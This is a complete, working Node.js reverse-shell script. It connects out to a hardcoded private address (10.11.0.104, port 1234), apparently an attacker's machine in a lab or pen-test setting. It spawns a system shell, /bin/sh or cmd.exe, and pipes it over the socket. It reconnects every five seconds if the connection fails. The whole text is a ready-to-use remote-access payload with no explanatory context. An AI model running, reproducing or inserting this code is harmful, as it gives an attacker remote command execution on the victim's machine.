#!/usr/bin/env node

const net = require('net');
const spawn = require('child_process').spawn;

const HOST = '10.11.0.104';
const PORT = '1234';
const TIMEOUT = 5000;

function asdf(HOST, PORT) {
  const client = new net.Socket();

  client.connect(
    PORT,
    HOST,
    () => {
      const sh = spawn(process.platform === 'win32' ? 'cmd.exe' : '/bin/sh');

      client.write('[*] Connected\r\n');
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);

      sh.on('exit', () => client.end('[*] Disconnected\r\n'));
    }
  );

  client.on('error', () => setTimeout(() => asdf(HOST, PORT), TIMEOUT));
}

asdf(HOST, PORT);
